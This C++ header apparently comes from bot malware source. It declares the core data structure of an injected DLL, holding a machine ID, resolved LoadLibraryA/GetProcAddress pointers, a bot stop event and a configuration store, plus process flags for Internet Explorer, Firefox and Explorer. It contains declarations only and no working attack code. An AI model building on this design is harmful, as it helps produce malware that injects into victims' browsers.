#pragma once

#include "..\common\binstorage.h"
#include "..\common\generateddata.h"

#pragma pack(push, 1)
typedef struct
{
	DWORD pid;							//Process ID.
	DWORD flags;						//Process flags.
	WCHAR compId[60];					// Computer unic ID
	WCHAR currentProcessPath[MAX_PATH]; //For takebotpath.
	DWORD winVersion;					// Windows version
	BYTE integrityLevel;				// Integrity level
	struct
	{
		HMODULE currentModule;				// Current module
		HMODULE kernel32;
	} modules;
	struct
	{
		void* pLoadLibraryA;
		void* pGetProcAddress;
	} winapi;
	LPSTR httpUserAgent;				// UserAgent string, should call DllCore::initHttpUserAgent() before using
	HANDLE stopEvent;					// Event that has signal when bot is stopped
	BinStorage::STORAGE * currentConfig;// Current config
}COREDLLDATA;
#pragma pack(pop)

extern COREDLLDATA coreDllData;

namespace DllCore
{

	void *__GetProcAddress(HMODULE module, LPSTR name);

	void bootStrap(HMODULE module, bool runnedFromInjectedCode);

	bool init(HMODULE module, DWORD flags);

	void uninit(void);
	
	/*
	Инициализация coreDllData.httpUserAgent. Необходимо вызывать эту функцию перед доступом к 
	coreDllData.httpUserAgent.
	*/
	void initHttpUserAgent(void);

	bool isActive(void);
	bool coreStart(HMODULE module);

	enum
	{
		PROCESS_IE      = 0x01,
		PROCESS_FIREFOX = 0x02,
		PROCESS_EXPLORER = 0x04,
		PROCESS_UNKNOWN = 0x08,
	};
};